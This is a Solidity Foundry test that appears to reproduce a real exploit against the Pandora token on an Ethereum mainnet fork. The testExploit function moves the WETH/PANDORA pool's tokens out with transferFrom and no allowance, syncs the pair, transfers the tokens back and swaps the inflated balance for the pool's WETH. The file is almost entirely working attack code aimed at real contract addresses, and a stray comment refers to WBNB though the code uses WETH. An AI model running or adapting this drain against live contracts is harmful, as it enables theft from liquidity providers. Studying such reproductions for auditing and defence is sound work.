// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV2.sol";

import "./IPandoras.sol";

WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
IPandoras constant PANDORA = IPandoras(
    0xddaDF1bf44363D07E750C20219C2347Ed7D826b9
);
IUniswapV2Pair constant WETH_PANDORA_Pool = IUniswapV2Pair(
    0x89CB997C36776D910Cfba8948Ce38613636CBc3c
);
IUniswapV2Router constant UNISWAP_V2_ROUTER = IUniswapV2Router(
    0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
);

contract PandoraTest is Test {
    function setUp() external {
        vm.createSelectFork("mainnet", 19184577);
        deal(address(WETH), address(this), 0);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() external {
        print("[Begin] WETH before", WETH.balanceOf(address(this)), 18);

        uint256 pool_pandora_balance = PANDORA.balanceOf(
            address(WETH_PANDORA_Pool)
        );
        PANDORA.transferFrom(
            address(WETH_PANDORA_Pool),
            address(PANDORA),
            pool_pandora_balance - 1
        );

        WETH_PANDORA_Pool.sync();

        (uint256 ethReserve, uint256 oldPANDORAReserve, ) = WETH_PANDORA_Pool
            .getReserves();
        ethReserve;

        PANDORA.transferFrom(
            address(PANDORA),
            address(WETH_PANDORA_Pool),
            pool_pandora_balance - 1
        );

        uint256 newPANDORAReserve = PANDORA.balanceOf(
            address(WETH_PANDORA_Pool)
        );
        uint256 amountin = newPANDORAReserve - oldPANDORAReserve;

        // uint256
        address[] memory path = new address[](2);
        path[0] = address(PANDORA);
        path[1] = address(WETH);
        uint[] memory amounts = UNISWAP_V2_ROUTER.getAmountsOut(amountin, path);
        // print("amounts[0]", amounts[0], 18);
        // print("amounts[1]", amounts[1], 18);
        uint256 outAmount = amounts[1];

        // uint256 outAmount = (amountin * 9975 * ethReserve) /
        //     (oldPANDORAReserve * 10_000 + amountin * 9975);

        //swap PANDORA to WBNB
        WETH_PANDORA_Pool.swap(outAmount, 0, address(this), "");
        print("[End] WETH after", WETH.balanceOf(address(this)), 18);
    }
}
